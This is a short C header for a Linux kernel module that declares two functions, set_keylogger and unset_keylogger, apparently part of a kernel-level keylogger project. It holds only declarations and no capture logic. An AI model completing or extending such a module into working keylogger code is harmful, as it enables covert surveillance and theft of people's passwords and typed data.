#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/kernel.h>
#include <linux/module.h>

void set_keylogger ( void );
void unset_keylogger ( void );

#endif